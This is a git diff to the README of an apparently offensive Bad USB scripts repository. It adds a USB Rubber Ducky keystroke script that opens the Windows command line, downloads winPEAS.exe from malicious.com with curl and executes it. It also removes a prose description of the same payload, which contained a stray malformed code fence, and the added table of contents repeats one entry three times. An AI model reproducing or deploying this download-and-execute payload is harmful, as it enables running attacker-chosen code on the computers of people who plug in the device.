@@ -25,11 +25,18 @@
 - [📍 Overview](#-overview)
 - [⚙️ Features](#️-features)
 - [👾 List of Bad USB scripts](#-list-of-Bad-USB-scripts)
+- 
+  - [1️⃣ winPEAS payload delivered by curl ](#️-winPEAS-payload-delivered-by-curl)
+  - [2️⃣ winPEAS payload delivered by curl ](#️-winPEAS-payload-delivered-by-curl)
+  - [3️⃣ winPEAS payload delivered by curl ](#️-winPEAS-payload-delivered-by-curl)
+
 - [🚀 Getting Started](#-getting-started)
+  
   - [✔️ Prerequisites](#️-prerequisites)
   - [💻 Installation](#-installation)
   - [🎮 Generating payloads](#-Generating-payloads)
   - [⚠️ Warning](#-warning)
+    
 - [🤝 Contributing](#-contributing)
 - [📄 License](#-license)
 - [👏 Acknowledgments](#-acknowledgments)
@@ -46,37 +53,40 @@
 
 ***BadUSB*** is a computer security attack using USB devices that are programmed with malicious software.For example, USB flash drives can contain a programmable Intel 8051 microcontroller, which can be reprogrammed, turning a USB flash drive into a malicious device. This attack works by programming the fake USB flash drive to emulate a keyboard, which once plugged into a computer, is automatically recognized and allowed to interact with the computer, and can then initiate a series of keystrokes which open a command window and issue commands to download malware.
 
-
----
-
-## ⚙️ Features
-
-This payload, titled "Bad USB - winPEAS," is a script designed for USB Rubber Ducky or similar devices. It targets Windows 10/11 systems and performs the following actions:
-
-Delays for 2 seconds to ensure the target system recognizes the device.
-
-Emulates keyboard inputs to open the Windows Command Line:
-
-Activates the Start menu.
-Types "cmd" to open the Command Line.
-Executes a series of commands:
-
-Disables command echo.
-Sets variables for a malicious download:
-"downloadURL" points to a remote location.
-"downloadPath" specifies a local path.
-"runCommand" specifies the path to the downloaded file.
-Downloads a file from the "downloadURL" and saves it locally.
-Executes the downloaded file.
-This payload aims to download and execute a potentially malicious file from a remote source. It leverages USB Rubber Ducky for physical delivery and targets Windows 10/11 Command Line environments.
-``sh
-dddd
-``sh
-
 ---
 
 ## 👾 List of Bad USB scripts
 
+```sh
+REM Title: Bad USB - winPEAS payload delivered by curl
+REM Author: DannnyzZ
+REM Date: 10.15.2023
+REM Description: Opens commandline, then curls payload from github repository
+REM Target: Windows 10/11 (cmd)
+REM Version: 1.0
+
+REM Pause for everything to recognize and be ready
+DELAY 2000
+
+REM Open Command Line
+CTRL ESC
+DELAY 750
+STRING cmd
+DELAY 250
+ENTER
+DELAY 1000
+ENTER
+
+REM Execute curl payload from link
+@echo off
+REM Input command
+STRING @echo off && set "downloadURL=https://www.malicious.com/winPEAS.exe" && set "downloadPath=%USERPROFILE%\winPEAS.exe" && set "runCommand=%USERPROFILE%\winPEAS.exe"
+ENTER
+DELAY 750
+STRING curl -LJO "%downloadURL%" && move "winPEAS.exe" "%downloadPath%" && start "" "%runCommand%"
+ENTER
+
+```
 
 ## 🚀 Getting Started
 
